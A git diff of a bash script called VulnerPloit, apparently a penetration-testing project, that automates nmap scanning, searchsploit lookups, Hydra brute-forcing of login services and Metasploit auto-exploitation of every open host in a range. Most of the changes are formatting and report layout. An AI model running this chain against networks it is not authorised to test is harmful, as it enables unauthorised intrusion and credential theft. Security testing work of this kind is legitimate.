@@ -63,8 +63,8 @@ function INSTALL()
 	mkdir figrc
 	cd ~/VulnerPloit/figrc
 	sudo apt-get -y install figlet
-	# install cybermedium figlet font; credits: http://www.figlet.org
-	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
+	# install cyberlarge figlet font; credits: http://www.figlet.org
+	wget http://www.jave.de/figlet/fonts/details/cyberlarge.flf
 	cd ~/VulnerPloit
 	
 	### CORE APPLICATIONS INSTALLATION
@@ -97,7 +97,7 @@ function NMAP_SCAN()
     
         ## SCANNING
         # execute nmap scan with -Pn flag to avoid firewall
-	# save the scan output in greppable format for text manipulation later
+		# save the scan output in greppable format for text manipulation later
         sudo nmap -Pn -T4 -p0-65535 $netrange -oG nmap_scan.txt 2>/dev/null 
         
         ### END
@@ -160,10 +160,10 @@ function NMAP_ENUM()
 	done
 	
 	### END
-        # let user know that the enumeration is done
-        echo " "
-        echo "[+] Nmap Scripting Engine Enumeration has been executed."
-        echo " "
+    # let user know that the enumeration is done
+    echo " "
+    echo "[+] Nmap Scripting Engine Enumeration has been executed."
+    echo " "
 }
 
 ###############################
@@ -175,8 +175,8 @@ function NMAP_ENUM()
 function SEARCHSPLOIT_VULN()
 {
 	### START
-    	echo " "
-   	 echo "[*] EXECUTION OF SEARCHSPLOIT_VULN MODULE:"
+    echo " "
+   	echo "[*] EXECUTION OF SEARCHSPLOIT_VULN MODULE:"
 	echo " "
 	echo "[*] Parsing output data from NMAP_ENUM Module..."
 	echo " "
@@ -199,10 +199,10 @@ function SEARCHSPLOIT_VULN()
 	done
 	
 	### END
-        # let user know that the detection is done
-        echo " "
-        echo "[+] Searchsploit Vulnerability Detection has been executed."
-        echo " "
+    # let user know that the detection is done
+    echo " "
+    echo "[+] Searchsploit Vulnerability Detection has been executed."
+    echo " "
 }
 
 #########################
@@ -214,11 +214,11 @@ function SEARCHSPLOIT_VULN()
 function HYDRA_BRUTE()
  {
 	### START
-    	echo " "
+    echo " "
    	echo "[*] EXECUTION OF HYDRA_BRUTE MODULE:"
    	echo " "
    	echo "[*] Parsing output data from NMAP_SCAN Module..."
-    	echo " "
+    echo " "
 	echo "[*] Executing Hydra Brute-Force Attack on open hosts and login services......(This may take a long time)"
 	echo " "
 	
@@ -245,8 +245,8 @@ function HYDRA_BRUTE()
 		# extract a list of open services by susbtituting space with line break, then filtering the services
 		echo $(cat linedata.txt | tr " " "\n" | grep open | tr "/" " " | awk '{print $4}') > openservices.lst		
       	
-      		### BRUTE-FORCE ATTACK
-      		# brute-force through all the open services for this open host
+      	### BRUTE-FORCE ATTACK
+      	# brute-force through all the open services for this open host
 		for openservice in $(cat openservices.lst)
 		do
 			echo "[*] Attacking $openservice on $openhost......"
@@ -284,8 +284,8 @@ function HYDRA_BRUTE()
 function MSF_EXPLOIT()
 {
 	### START
-    	echo " "
-    	echo "[*] EXECUTION OF MSF_EXPLOIT MODULE:"
+    echo " "
+    echo "[*] EXECUTION OF MSF_EXPLOIT MODULE:"
 	echo " "
 	echo "[*] Setting up Metasploit Framework database......"
 	echo " "
@@ -322,20 +322,18 @@ function MSF_EXPLOIT()
 		### MSF RESOURCE SCRIPTING
 		cd ~/VulnerPloit/$session/$rangename
 		# create a .rc file to act as a script for msf console        
-        	echo "use exploit/$exploit_single" > ${openhost}_msfscript.rc
-        	echo "set rhosts $openhost" >> ${openhost}_msfscript.rc
+        echo "use exploit/$exploit_single" > ${openhost}_msfscript.rc
+        echo "set rhosts $openhost" >> ${openhost}_msfscript.rc
 		listenerhost=$(echo "$(ifconfig | grep broadcast | awk '{print $2}')")
-        	echo "set lhost $listenerhost" >> ${openhost}_msfscript.rc
+        echo "set lhost $listenerhost" >> ${openhost}_msfscript.rc
 		# include -j to run multiple exploit shells in multiple background sessions
-       		echo "exploit -j" >> ${openhost}_msfscript.rc
-		
+       	echo "exploit -j" >> ${openhost}_msfscript.rc
+       	# spool the output of the MSF console after see the result of the exploit attempt
+       	echo "spool ~/VulnerPloit/$session/$rangename/${openhost}_msfoutput.txt" >> ${openhost}_msfscript.rc
 		
 		### EXPLOITATION
-		# use -q to run msfconsole without the banner, and -r to run resource script
-		msfconsole -q -r ${openhost}_msfscript.rc 2>/dev/null -o ${openhost}_msfoutput.txt
-		
-		### TEXT MANIPULATION
-		# delete everything from msfoutput except exploited device, the successful exploit shell, and shell session
+		# use -q to run msfconsole without the banner, and -r to execute resource script within console
+		msfconsole -q -r ${openhost}_msfscript.rc 2>/dev/null
 		
 	done
 	
@@ -364,16 +362,9 @@ function LOG()
 	for openhost in $(cat nmap_openhosts.lst)
 	
 	do
-		
-		### SPECIFIC OPEN HOST SUBDIRECTORY
-		# create subdirectory for specific host
+				
+		### INDIVIDUAL HOST VULNERABILITY REPORT
 		cd ~/VulnerPloit/$session/$rangename
-		mkdir $openhost
-		cd $openhost
-		# make a subdirectory to organise raw output later 
-		mkdir raw_output
-		
-		### SPECIFIC OPEN HOST REPORT
 		# create log file
 		touch ${openhost}_vulnmap.txt
 		# insert title and date-time
@@ -402,8 +393,8 @@ function LOG()
 		echo "$(cat ${openhost}_enum.txt | grep tcp | grep open)" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
 		
-		### POSSIBLE EXPLOITS LOGGING
-		echo "POSSIBLE EXPLOITS" >> ${openhost}_vulnmap.txt
+		### POTENTIAL EXPLOITS LOGGING
+		echo "POTENTIAL EXPLOITS" >> ${openhost}_vulnmap.txt
 		echo "-----------------" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
 		# trim irrelevant lines
@@ -417,16 +408,22 @@ function LOG()
 		echo "$(cat ${openhost}_passwords.txt)" >> ${openhost}_vulnmap.txt
 		echo " "
 		
-		### EXPLOITED DEVICES
-		echo "EXPLOITED DEVICES" >> ${openhost}_vulnmap.txt
-		echo "-----------------" >> ${openhost}_vulnmap.txt
+		### EXPLOITATION ATTEMPTS
+		echo "EXPLOITATION ATTEMPTS" >> ${openhost}_vulnmap.txt
+		echo "---------------------" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
 		echo "$(cat ${openhost}_msfoutput.txt)" >> ${openhost}_vulnmap.txt
 		echo " "
 		
-		### MAKE A COPY FOR COMBINATION LATER
-		# copy the individual host report to the range directory
-		cp ${openhost}_vulnmap.txt ~/VulnerPloit/$session/$rangename
+		### INDIVIDUAL HOST SUBDIRECTORY
+		# create subdirectory for specific host
+		mkdir ~/VulnerPloit/$session/$rangename/$openhost
+		# make a subdirectory to organise raw output later 
+		mkdir ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		
+		### COPY INDIVIDUAL HOST VULNERABILITY REPORT
+		# keep a copy of the individual host report in the shared range directory, for combination later
+		cp ${openhost}_vulnmap.txt ~/VulnerPloit/$session/$rangename/$openhost
 		
 		### ORGANISING RAW OUTPUT FILES FOR INDIVIDUAL HOSTS
 		cd ~/VulnerPloit/$session/$rangename
@@ -447,7 +444,7 @@ function LOG()
 	### REPORT
 	# print the combined report into the terminal 
 	# insert figlet before the combined output
-	echo "$(figlet -c -f ~/VulnerMapper/figrc/cybermedium.flf -t "VulnerPloit")" >> ${openhost}_vulnmap.txtt
+	echo "$(figlet -c -f ~/VulnerPloit/figrc/cyberlarge.flf -t "VulnerPloit")" >> ${openhost}_vulnmap.txtt
 	cat ${rangename}_vulnmap.txt
 	echo " "
 	echo "[+] VULNERABILITY MAP REPORT:"
@@ -498,7 +495,7 @@ function CONSOLE()
 	### CONSOLE DISPLAY
 	# display figlet for aesthetics, with short description of program
 	echo " "
-	figlet -c -f ~/VulnerPloit/figrc/cybermedium.flf -t "VULNERPLOIT"
+	figlet -c -f ~/VulnerPloit/figrc/cyberlarge.flf -t "VULNERPLOIT"
 	# description of functions
 	echo " "
 	echo ">>> written by C-Dr4gon (https://github.com/C-Dr4gon)"
